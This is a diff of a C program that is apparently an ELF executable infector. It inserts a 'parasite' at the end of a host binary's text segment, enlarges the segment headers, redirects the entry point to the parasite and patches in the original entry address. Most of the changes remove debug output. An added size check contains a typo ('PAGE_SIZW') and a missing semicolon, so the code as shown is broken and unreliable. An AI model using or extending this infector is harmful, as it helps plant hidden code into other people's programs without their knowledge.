@@ -9,19 +9,12 @@
 #include <fcntl.h>
 #include <elf.h>
 
-#define MAX_PARASITE 4096
 #define PAGE_SIZE 4096
 #define TMP "tmp.bin"
-
-#ifndef DEBUG
-#define DEBUG 1 
-#endif
 
 int hfd, pfd;
 int patch_position;
 struct stat hst, pst;
-
-void infect_elf();
 
 int main(int argc, char **argv)
 {
@@ -60,7 +53,7 @@ int main(int argc, char **argv)
     unsigned long entry_point, text_offset, text_begin;
     unsigned char *mem;
     unsigned int entry_offset;
-    unsigned char buf[MAX_PARASITE];
+    unsigned char buf[PAGE_SIZE];
     unsigned int ehdr_size;
     int ofd;
     int psize;
@@ -72,10 +65,6 @@ int main(int argc, char **argv)
 
 
     psize = pst.st_size;
-    if (DEBUG)
-    {
-        printf("psize = %d\n", psize);
-    }
 
     mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
     if (mem == MAP_FAILED)
@@ -88,10 +77,6 @@ int main(int argc, char **argv)
     entry_point = e_hdr->e_entry;
     ehdr_size = sizeof(*e_hdr);
 
-    if (DEBUG)
-    {
-        printf("ehdr_size: %d\n", ehdr_size);
-    }
 
     if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
     {
@@ -119,13 +104,6 @@ int main(int argc, char **argv)
                 entry_offset = p_hdr->p_filesz; // offset to parasite entry point
                 p_hdr->p_filesz += psize;
                 p_hdr->p_memsz += psize;
-                if (DEBUG)
-                {
-                    printf("Going to place parasite at 0x%x in file\n", 
-                        text_offset + entry_offset); 
-                    printf("Going to place parasite at 0x%x in image\n",
-                        p_hdr->p_vaddr + entry_offset);
-                }
             }
     }
 
@@ -144,12 +122,13 @@ int main(int argc, char **argv)
 
     // modify entry_point to point to parasite at the end of .text
     e_hdr->e_entry = text_begin + entry_offset;
-    if (DEBUG)
+
+    if (psize > PAGE_SIZW)
     {
-        printf("set entry point to 0x%x\n", e_hdr->e_entry);
+        printf("parasite too large\n")
+        exit(-1);
     }
-    // read parasite into buffer
-    // I know this is a bad 
+
     if (read(pfd, buf, psize) == -1)
     {
         perror("parasite: read");
@@ -158,11 +137,6 @@ int main(int argc, char **argv)
 
     int preparasite_size_file = text_offset + entry_offset;
     int preparasite_size_image =  entry_offset - text_offset;
-    if (DEBUG)
-    {
-        printf("preparasite_size_file = 0x%x\n", preparasite_size_file);
-        printf("preparasite_size_image = 0x%x\n", preparasite_size_image);
-    }
 
     // patch parasite code
     *(unsigned long *)&buf[patch_position] = entry_point;
@@ -181,25 +155,13 @@ int main(int argc, char **argv)
         perror("tmp binary: write contents up to parasite");
         exit(-1);
     }
-    if (DEBUG)
-    {
-        printf("wrote 0x%x bytes of preparasite information\n", wrote);
-    }
 
     if ((wrote = write(ofd, buf, psize)) != psize) 
     {
         perror("tmp binary: write parasite");
         exit(-1);
     }
-    if (DEBUG)
-    {
-        printf("wrote 0x%x bytes of parasite information\n", wrote);
-    }
 
-    if (DEBUG) 
-    {
-        printf("about to write 0x%x bytes to pad to PAGE_SIZE\n", PAGE_SIZE-psize);
-    }
     // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
     if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
     {
